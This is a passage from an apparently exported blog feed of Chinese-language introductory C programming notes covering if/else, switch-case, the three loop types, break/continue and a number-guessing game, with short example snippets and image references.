*/注释</h3><ul><li>延续数行的注释，要用多行注释的格式来写。多行注释由一对字符序列“/*”开始，而以“*/”结束。</li><li>也可以用于一行内的注释</li><li>int ak=47 /* 36*/, y=9;</li></ul><h3 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h3><p><img src="/images/c%E8%AF%AD%E8%A8%80/3.1-004.png" alt="比较"></p><h3 id="判断票面够不够"><a href="#判断票面够不够" class="headerlink" title="判断票面够不够"></a>判断票面够不够</h3><p><img src="/images/c%E8%AF%AD%E8%A8%80/3.1-005.png" alt="判断票面够不够"></p><h3 id="不够怎么办？"><a href="#不够怎么办？" class="headerlink" title="不够怎么办？"></a>不够怎么办？</h3><p><img src="/images/c%E8%AF%AD%E8%A8%80/3.1-006.png" alt="判断票面够不够"></p><h3 id="画流程图来看看"><a href="#画流程图来看看" class="headerlink" title="画流程图来看看"></a>画流程图来看看</h3><p><img src="/images/c%E8%AF%AD%E8%A8%80/3.1-007.png" alt="流程图"></p><p><img src="/images/c%E8%AF%AD%E8%A8%80/3.1-008.png" alt="流程图"></p><p><img src="/images/c%E8%AF%AD%E8%A8%80/3.1-009.png" alt="流程图"></p><h3 id="比较数的大小"><a href="#比较数的大小" class="headerlink" title="比较数的大小"></a>比较数的大小</h3><p><img src="/images/c%E8%AF%AD%E8%A8%80/3.1-010.png" alt="比较数的大小"></p><p>方案1</p><p><img src="/images/c%E8%AF%AD%E8%A8%80/3.1-002.bmp" alt="比较数的大小"></p><p>方案2</p><p><img src="/images/c%E8%AF%AD%E8%A8%80/3.1-003.bmp" alt="比较数的大小"></p><p>方案3</p><p><img src="/images/c%E8%AF%AD%E8%A8%80/3.1-004.bmp" alt="比较数的大小"></p><p>比较一下</p><p><img src="/images/c%E8%AF%AD%E8%A8%80/3.1-011.png" alt="比较一下"></p><h3 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h3><ul><li>一个基本的if语句由一个关键字if开头，跟上在括号里的一个表示条件的逻辑表达式，然后是一对大括号“{}”之间的若干条语句。如果表示条件的逻辑表达式的结果不是零，那么就执行后面跟着的这对大括号中的语句，否则就跳过这些语句不执行，而继续下面的其他语句。<br>if ( total &gt; amount )<br>total += amount+10;<br>if语句这一行结束的时候并没有表示语句结束的“;”，而后面的赋值<br>语句写在if的下一行，并且缩进了，在这一行结束的时候有一个表示句结束的“;”。这表明这条赋值语句是if语句的一部分，if语句拥有和控制这条赋值语句，决定它是否要被执行。</li></ul><h3 id="判断成绩"><a href="#判断成绩" class="headerlink" title="判断成绩"></a>判断成绩</h3><p><img src="/images/c%E8%AF%AD%E8%A8%80/3.1-012.png" alt="判断成绩"></p>]]></content>
      <categories>
        <category>C语言</category>
      </categories>
      <tags>
        <tag>C语言</tag>
      </tags>
  </entry>
  <entry>
    <title>3.2 分支</title>
    <url>/C%E8%AF%AD%E8%A8%80/d32ea010.html</url>
    <content><![CDATA[<h3 id="嵌套的if"><a href="#嵌套的if" class="headerlink" title="嵌套的if"></a>嵌套的if</h3><p>找两个数中的最大</p><p><img src="/images/c%E8%AF%AD%E8%A8%80/3.2-001.bmp" alt="两个数中的最大"></p><p>找三个数中的最大？</p><p><img src="/images/c%E8%AF%AD%E8%A8%80/3.2-002.bmp" alt="三个数中的最大"></p><p><img src="/images/c%E8%AF%AD%E8%A8%80/3.2-003.bmp" alt="流程图"></p><p><img src="/images/c%E8%AF%AD%E8%A8%80/3.2-001.png" alt="三个数中的最大"></p><h3 id="嵌套的判断"><a href="#嵌套的判断" class="headerlink" title="嵌套的判断"></a>嵌套的判断</h3><p>当if的条件满足或者不满足的时候要执行的语句也可以是一条if或if-else语句，这就是嵌套的if语句</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( code == READY )</span><br><span class="line">    <span class="keyword">if</span> ( count &lt;<span class="number">20</span> )</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">"一切正常\n"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">"继续等待\n"</span>);</span><br></pre></td></tr></table></figure><h3 id="else的匹配"><a href="#else的匹配" class="headerlink" title="else的匹配"></a>else的匹配</h3><ul><li>else总是和最近的那个if匹配</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( code == READY ) &#123;</span><br><span class="line">    <span class="keyword">if</span> ( count &lt;<span class="number">20</span> )</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">"一切正常\n"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"继续等待\n"</span>);</span><br></pre></td></tr></table></figure><h3 id="缩进"><a href="#缩进" class="headerlink" title="缩进"></a>缩进</h3><ul><li>缩进格式不能暗⽰示else的匹配</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( code == READY )</span><br><span class="line">	<span class="keyword">if</span> ( count &lt;<span class="number">20</span> )</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"一切正常\n"</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"继续等待\n"</span>);</span><br></pre></td></tr></table></figure><h3 id="嵌套的if-1"><a href="#嵌套的if-1" class="headerlink" title="嵌套的if"></a>嵌套的if</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( gameover == <span class="number">0</span> )</span><br><span class="line">	<span class="keyword">if</span> ( player2move == <span class="number">2</span> )</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Your turn\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( gameover == <span class="number">0</span> )</span><br><span class="line">	<span class="keyword">if</span> ( player2move == <span class="number">2</span> )</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Your turn\n"</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"My turn\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( gameover == <span class="number">0</span> )</span><br><span class="line">	<span class="keyword">if</span> ( player2move == <span class="number">2</span> )</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Your turn\n"</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"My turn\n"</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"GAME OVER\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( gameover == <span class="number">0</span> )</span><br><span class="line">	<span class="keyword">if</span> ( player2move == <span class="number">2</span> )</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Your turn\n"</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"GAME OVER\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( gameover == <span class="number">0</span> ) &#123;</span><br><span class="line">	<span class="keyword">if</span> ( player2move == <span class="number">2</span> )</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Your turn\n"</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"GAME OVER\n"</span>);</span><br></pre></td></tr></table></figure><h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h3><ul><li>在if或else后面总是用{}</li><li>即使只有一条语句的时候</li></ul><h3 id="级联的if-else-if"><a href="#级联的if-else-if" class="headerlink" title="级联的if-else if"></a>级联的if-else if</h3><h4 id="分段函数"><a href="#分段函数" class="headerlink" title="分段函数"></a>分段函数</h4><p><img src="/images/c%E8%AF%AD%E8%A8%80/3.2-002.png" alt="分段函数"></p><h4 id="级联的if-else-if-1"><a href="#级联的if-else-if-1" class="headerlink" title="级联的if-else if"></a>级联的if-else if</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( exp1 )</span><br><span class="line">	st1;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( exp2 )</span><br><span class="line">	st2;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	st3;</span><br></pre></td></tr></table></figure><h3 id="if语句常见错误"><a href="#if语句常见错误" class="headerlink" title="if语句常见错误"></a>if语句常见错误</h3><ul><li>忘了大括号</li><li>if后面的分号</li><li>错误使用==和=</li><li>使人困惑的else</li></ul><h4 id="忘了大括号"><a href="#忘了大括号" class="headerlink" title="忘了大括号"></a>忘了大括号</h4><p><img src="/images/c%E8%AF%AD%E8%A8%80/3.2-003.png" alt="忘了大括号"></p><ul><li>永远在if和else后面加上大括号，即使当时后面只有一条语句</li></ul><h4 id="if后面的分号"><a href="#if后面的分号" class="headerlink" title="if后面的分号"></a>if后面的分号</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( age &gt; <span class="number">60</span> );</span><br><span class="line">&#123;</span><br><span class="line">    salary = salary * <span class="number">1.2</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%f"</span>,salay);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="错误使用-和"><a href="#错误使用-和" class="headerlink" title="错误使用==和="></a>错误使用==和=</h3><ul><li>if只要求()里的值是零或非零</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( a = b )</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"A=B"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="代码风格"><a href="#代码风格" class="headerlink" title="代码风格"></a>代码风格</h3><ul><li>在if和else之后必须加上大括号形成语句块；</li><li>大括号内的语句缩进一个tab的位置；</li></ul><h3 id="风格是三观…"><a href="#风格是三观…" class="headerlink" title="风格是三观…"></a>风格是三观…</h3><p><img src="/images/c%E8%AF%AD%E8%A8%80/3.2-004.png" alt="代码风格"></p><h3 id="多路分支"><a href="#多路分支" class="headerlink" title="多路分支"></a>多路分支</h3><h4 id="switch-case"><a href="#switch-case" class="headerlink" title="switch-case"></a>switch-case</h4><p><img src="/images/c%E8%AF%AD%E8%A8%80/3.2-005.png" alt="多路分支"></p><p><img src="/images/c%E8%AF%AD%E8%A8%80/3.2-006.png" alt="switch-case"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> ( 控制表达式 ) &#123;</span><br><span class="line"><span class="keyword">case</span> 常量:</span><br><span class="line">	语句</span><br><span class="line">	……</span><br><span class="line"><span class="keyword">case</span> 常量:</span><br><span class="line">	语句</span><br><span class="line">	……</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">	语句</span><br><span class="line">	……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/c%E8%AF%AD%E8%A8%80/3.2-007.png" alt="break"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> ( type )</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"你好\n"</span>);</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"晚上好\n"</span>);</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"再见\n"</span>);</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"啊，什么啊？\n"</span>);</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="月份转换"><a href="#月份转换" class="headerlink" title="月份转换"></a>月份转换</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"请输入月份："</span>);</span><br><span class="line"><span class="keyword">int</span> month;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;month);</span><br><span class="line"><span class="keyword">switch</span> ( month ) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>: <span class="built_in">printf</span>(<span class="string">"January\n"</span>); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>: <span class="built_in">printf</span>(<span class="string">"February\n"</span>); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>: <span class="built_in">printf</span>(<span class="string">"March\n"</span>); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>: <span class="built_in">printf</span>(<span class="string">"April\n"</span>); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>: <span class="built_in">printf</span>(<span class="string">"May\n"</span>); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>: <span class="built_in">printf</span>(<span class="string">"June\n"</span>); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">7</span>: <span class="built_in">printf</span>(<span class="string">"July\n"</span>); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">8</span>: <span class="built_in">printf</span>(<span class="string">"August\n"</span>); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">9</span>: <span class="built_in">printf</span>(<span class="string">"September\n"</span>); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">10</span>:<span class="built_in">printf</span>(<span class="string">"October\n"</span>); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">11</span>:<span class="built_in">printf</span>(<span class="string">"November\n"</span>); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">12</span>:<span class="built_in">printf</span>(<span class="string">"December\n"</span>); <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="try"><a href="#try" class="headerlink" title="try"></a>try</h3><p>f(x) = -1; x&lt;0<br>0; x=0<br>2x; x&gt;0</p><ul><li>这个分段函数能否用switch-case?</li></ul>]]></content>
      <categories>
        <category>C语言</category>
      </categories>
      <tags>
        <tag>C语言</tag>
      </tags>
  </entry>
  <entry>
    <title>4.1 循环</title>
    <url>/C%E8%AF%AD%E8%A8%80/ca1771c6.html</url>
    <content><![CDATA[<h3 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h3><ul><li>如果我们把while翻译作“当”，那么一个while循环的意思就是：当条件满足时，不断地重复循环体内的语句。</li><li>循环执行之前判断是否继续循环，所以有可能循环一次也没有被执行；</li><li>条件成立是循环继续的条件。</li></ul><p><img src="/images/c%E8%AF%AD%E8%A8%80/4.1-004.png" alt="循环"></p><h3 id="do-while循环"><a href="#do-while循环" class="headerlink" title="do-while循环"></a>do-while循环</h3><p>在进入循环的时候不做检查，而是在执行完一轮循环体的代码之后，再来检查循环的条件是否满足，如果满足则继续下一轮循环，不满足则结束循环</p><p>do<br>{<br>&lt;循环体语句&gt;<br>} while ( &lt;循环条件&gt; );</p><p><img src="/images/c%E8%AF%AD%E8%A8%80/4.1-001.png" alt="循环"></p><p><img src="/images/c%E8%AF%AD%E8%A8%80/4.1-002.png" alt="循环"></p><h3 id="两种循环"><a href="#两种循环" class="headerlink" title="两种循环"></a>两种循环</h3><p>do-while循环和while循环很像，区别是在循环体执行结束的时候才来判断条件。也<br>就是说，无论如何，循环都会执行至少一遍，然后再来判断条件。与while循环相同<br>的是，条件满足时执行循环，条件不满足时结束循环。</p><p><img src="/images/c%E8%AF%AD%E8%A8%80/4.1-003.png" alt="循环"></p>]]></content>
      <categories>
        <category>C语言</category>
      </categories>
      <tags>
        <tag>C语言</tag>
      </tags>
  </entry>
  <entry>
    <title>4.2 循环应用</title>
    <url>/C%E8%AF%AD%E8%A8%80/d0078288.html</url>
    <content><![CDATA[<h3 id="循环计算"><a href="#循环计算" class="headerlink" title="循环计算"></a>循环计算</h3><h4 id="log2x"><a href="#log2x" class="headerlink" title="log2x"></a>log2x</h4><p><img src="/images/c%E8%AF%AD%E8%A8%80/4.2-001.png" alt="log2x"></p><h4 id="小套路"><a href="#小套路" class="headerlink" title="小套路"></a>小套路</h4><p><img src="/images/c%E8%AF%AD%E8%A8%80/4.2-002.png" alt="小套路"></p><h4 id="这些值是怎么定的？"><a href="#这些值是怎么定的？" class="headerlink" title="这些值是怎么定的？"></a>这些值是怎么定的？</h4><p><img src="/images/c%E8%AF%AD%E8%A8%80/4.2-003.png" alt="这些值是怎么定的"></p><h3 id="计数循环"><a href="#计数循环" class="headerlink" title="计数循环"></a>计数循环</h3><p><img src="/images/c%E8%AF%AD%E8%A8%80/4.2-004.png" alt="计数循环"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> count =<span class="number">10</span>;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d "</span>, count);</span><br><span class="line">	count --;</span><br><span class="line">&#125; <span class="keyword">while</span> ( count &gt;<span class="number">0</span> );</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"发射！\n"</span>);</span><br></pre></td></tr></table></figure><h3 id="循环应用"><a href="#循环应用" class="headerlink" title="循环应用"></a>循环应用</h3><h4 id="猜数游戏"><a href="#猜数游戏" class="headerlink" title="猜数游戏"></a>猜数游戏</h4><ul><li>让计算机来想一个数，然后让用户来猜，</li><li>用户每输入一个数，就告诉它是大了还是小了，直到用户猜中为止，最后还要告诉</li><li>用户它猜了多少次。</li><li>因为需要不断重复让用户猜，所以需要用到循环</li><li>在实际写出程序之前，我们可以先用文字描述程序的思路</li><li>核心重点是循环的条件</li><li>人们往往会考虑循环终止的条件</li></ul><ol><li>计算机随机想一个数，记在变量number里；</li><li>一个负责计次数的变量count初始化为0；</li><li>让用户输入一个数字a；</li><li>count递增（加一）；</li><li>判断a和number的大小关系，如果a大，就输出“大”；如果a小就输出“⼩小”；</li><li>如果a和number是不相等的（无论大还是小），程序转回到第3步；</li><li>否则，程序输出“猜中”和次数，然后结束。</li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">srand(time(<span class="number">0</span>));</span><br><span class="line"><span class="keyword">int</span> number = rand()%<span class="number">100</span>+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"我已经想好了一个1到100之间的数。"</span>);</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"请猜这个1到100之间数："</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;a);</span><br><span class="line">	count ++;</span><br><span class="line">    <span class="keyword">if</span> ( a &gt; number ) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"你猜的数大了。"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ( a &lt; number ) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"你猜的数小了。"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (a != number);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"太好了，你用了%d次就猜到了答案。\n"</span>, count);</span><br></pre></td></tr></table></figure><h3 id="随机数"><a href="#随机数" class="headerlink" title="随机数"></a>随机数</h3><ul><li>每次召唤rand()就得到一个随机的整数</li></ul><h3 id="100"><a href="#100" class="headerlink" title="%100"></a>%100</h3><ul><li>x % n 的结果是[0, n-1]的一个整数</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">srand(time(<span class="number">0</span>));</span><br><span class="line"><span class="keyword">int</span> number = rand()%<span class="number">100</span>+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"我已经想好了一个1到100之间的数。"</span>);</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"请猜这个1到100之间数："</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;a);</span><br><span class="line">	count ++;</span><br><span class="line">    <span class="keyword">if</span> ( a &gt; number ) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">"你猜的数大了。"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ( a &lt; number ) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">"你猜的数小了。"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (a != number);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"太好了，你用了%d次就猜到了答案。\n"</span>, count);</span><br></pre></td></tr></table></figure><h3 id="算平均数"><a href="#算平均数" class="headerlink" title="算平均数"></a>算平均数</h3><p><img src="/images/c%E8%AF%AD%E8%A8%80/4.2-001.bmp" alt="算平均数"></p><ul><li>让用户输入一系列的正整数，最后输入-1表示输入结束，然后程序计算出这些数字的平均数，输出输入的数字的个数和平均数</li><li>变量-&gt;算法-&gt;流程图-&gt;程序</li></ul><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><ul><li>一个记录读到的整数的变量</li><li>平均数要怎么算？</li><li>只需要每读到一个数，就把它加到一个累加的变量里，到全部数据读完，再拿<br>它去除读到的数的个数就可以了</li><li>一个变量记录累加的结果，一个变量记录读到的数的个数</li></ul><h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><ol><li>初始化变量sum和count为0；</li><li>读入number；</li><li>如果number不是-1，则将number加入sum，并将count加1，回到2；</li><li>如果number是-1，则计算和打印出sum / count（注意换成浮点来计算）。</li></ol><p><img src="/images/c%E8%AF%AD%E8%A8%80/4.2-005.png" alt="算法"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">number = <span class="number">0</span>;</span><br><span class="line">count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> ( number != <span class="number">-1</span> ) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;number);</span><br><span class="line">    <span class="keyword">if</span> ( number != <span class="number">-1</span> ) &#123;</span><br><span class="line">    	sum += number;</span><br><span class="line">    	count ++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/c%E8%AF%AD%E8%A8%80/4.2-006.png" alt="算法"></p><h4 id="整数的分解"><a href="#整数的分解" class="headerlink" title="整数的分解"></a>整数的分解</h4><ul><li>一个整数是由1至多位数字组成的，如何分解出整数的各个位上的数字，然后加以计算</li><li>对一个整数做%10的操作，就得到它的个位数；</li><li>对一个整数做/10的操作，就去掉了它的个位数；</li><li>然后再对2的结果做%10，就得到原来数的十位数了；</li><li>依此类推。</li></ul><h4 id="数的逆序"><a href="#数的逆序" class="headerlink" title="数的逆序"></a>数的逆序</h4><ul><li>输入一个正整数，输出逆序的数</li><li>结尾的0的处理</li></ul>]]></content>
      <categories>
        <category>C语言</category>
      </categories>
      <tags>
        <tag>C语言</tag>
      </tags>
  </entry>
  <entry>
    <title>5.1 第三种循环</title>
    <url>/C%E8%AF%AD%E8%A8%80/d0078288.html</url>
    <content><![CDATA[<h3 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h3><h4 id="阶乘"><a href="#阶乘" class="headerlink" title="阶乘"></a>阶乘</h4><ul><li>n! = 1×2×3×4×…×n</li><li>写一个程序，让用户输入n，然后计算输出n!</li><li>变量：</li><li>显然读用户的输入需要一个int的n，然后计算的结果需要用一个变量保存，可以<br>是int的factor，在计算中需要有一个变量不断地从1递增到n，那可以是int的i</li></ul><p><img src="/images/c%E8%AF%AD%E8%A8%80/5.1-001.bmp" alt="阶乘"></p><h4 id="for循环-1"><a href="#for循环-1" class="headerlink" title="for循环"></a>for循环</h4><p>for循环像一个计数循环：设定一个计数器，初始化它，然后在计数器到达某值之前，重复执⾏行循环体，<br>而每执行一轮循环，计数器值以一定步进进行调整，比如加1或者减1</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i=i+<span class="number">1</span> ) &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d"</span>, i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="for-＝-对于"><a href="#for-＝-对于" class="headerlink" title="for ＝ 对于"></a>for ＝ 对于</h4><ul><li>for ( count=10; count&gt;0; count– )</li><li>就读成：“对于一开始的count=10，当count&gt;0时，重复做循环体，每一轮循环在做完循环体内语句后，使得count–。”</li></ul><h3 id="小套路"><a href="#小套路" class="headerlink" title="小套路"></a>小套路</h3><ul><li><p>做求和的程序时，记录结果的变量应该初始化为0，而做求积的变量时，记录结果的变量应该初始化为1</p></li><li><p>循环控制变量i只在循环里被使用了，在循环外面它没有任何用处。因此，我们可以把变量i的定义写到for语句里面去</p></li></ul><p><img src="/images/c%E8%AF%AD%E8%A8%80/5.1-002.bmp" alt="小套路"></p><h4 id="try"><a href="#try" class="headerlink" title="try"></a>try</h4><ul><li>1×1还是1，所以程序的循环不需要从1开始，那么改成从多少开始合适呢？这样修改之后，程序对所有的n都正确吗？这样的改动有价值吗？</li><li>除了可以从1乘到n来计算n!，还可以从n乘到1来计算吧？试试把循环换个方向来计算n。这时候，还需要循环控制变量i吗？</li></ul><p><img src="/images/c%E8%AF%AD%E8%A8%80/5.1-001.png" alt="try"></p><h4 id="for-while"><a href="#for-while" class="headerlink" title="for == while"></a>for == while</h4><p><img src="/images/c%E8%AF%AD%E8%A8%80/5.1-002.png" alt="for == while"></p><h4 id="for循环-2"><a href="#for循环-2" class="headerlink" title="for循环"></a>for循环</h4><p>for ( 初始动作; 条件; 每轮的动作 ) {<br>}</p><ul><li>for中的每一个表达式都是可以省略的<br>for (; 条件; ) == while ( 条件 )</li></ul><h4 id="循环次数"><a href="#循环次数" class="headerlink" title="循环次数"></a>循环次数</h4><ul><li>for ( i=0; i&lt;n; i++ )</li><li>则循环的次数是n，而循环结束以后，i的值是n。循环的控制变量i，是选择从0开始还是从1开始，是判断i&lt;n还是判断i&lt;=n，对循环的次数，循环结束后变量的值都有影响</li></ul><h4 id="三种循环"><a href="#三种循环" class="headerlink" title="三种循环"></a>三种循环</h4><p><img src="/images/c%E8%AF%AD%E8%A8%80/5.1-003.png" alt="三种循环"></p><h4 id="Tips-for-loops"><a href="#Tips-for-loops" class="headerlink" title="Tips for loops"></a>Tips for loops</h4><ul><li>如果有固定次数，用for</li><li>如果必须执行一次，用do_while</li><li>其他情况用while</li></ul>]]></content>
      <categories>
        <category>C语言</category>
      </categories>
      <tags>
        <tag>C语言</tag>
      </tags>
  </entry>
  <entry>
    <title>5.2 循环控制</title>
    <url>/C%E8%AF%AD%E8%A8%80/6109d724.html</url>
    <content><![CDATA[<h3 id="break-vs-continue"><a href="#break-vs-continue" class="headerlink" title="break vs continue"></a>break vs continue</h3><ul><li>break: 跳出循环</li><li>continue: 跳过循环这一轮剩下的语句进入下一轮</li></ul><p><img src="/images/c%E8%AF%AD%E8%A8%80/5.2-001.png" alt="break vs continue"></p><h3 id="嵌套的循环"><a href="#嵌套的循环" class="headerlink" title="嵌套的循环"></a>嵌套的循环</h3><h4 id="100以内的素数"><a href="#100以内的素数" class="headerlink" title="100以内的素数"></a>100以内的素数</h4><ul><li>如何写程序输出100以内的素数？</li></ul><h4 id="嵌套的循环-1"><a href="#嵌套的循环-1" class="headerlink" title="嵌套的循环"></a>嵌套的循环</h4><ul><li>循环里面还是循环</li></ul><h4 id="前50个素数"><a href="#前50个素数" class="headerlink" title="前50个素数"></a>前50个素数</h4><ul><li>如何写程序输出前50个素数</li></ul><h3 id="嵌套循环时的break"><a href="#嵌套循环时的break" class="headerlink" title="嵌套循环时的break"></a>嵌套循环时的break</h3><h4 id="凑硬币"><a href="#凑硬币" class="headerlink" title="凑硬币"></a>凑硬币</h4><p>如何用1角、2角和5角的硬币凑出10元以下的金额呢？</p><p><img src="/images/c%E8%AF%AD%E8%A8%80/5.2-001.bmp" alt="凑硬币"></p><h4 id="break和continue"><a href="#break和continue" class="headerlink" title="break和continue"></a>break和continue</h4><ul><li>只能对它所在的那层循环做</li></ul><h4 id="接力break"><a href="#接力break" class="headerlink" title="接力break"></a>接力break</h4><p><img src="/images/c%E8%AF%AD%E8%A8%80/5.2-002.bmp" alt="接力break"></p><h4 id="goto"><a href="#goto" class="headerlink" title="goto"></a>goto</h4><p><img src="/images/c%E8%AF%AD%E8%A8%80/5.2-003.bmp" alt="goto"></p>]]></content>
      <categories>
        <category>C语言</category>
      </categories>
      <tags>
        <tag>C语言</tag>
      </tags>
  </entry>
  <entry>
    <title>5.3 循环应用</title>
    <url>/C%E8%AF%AD%E8%A8%80/e360f26f.html</url>
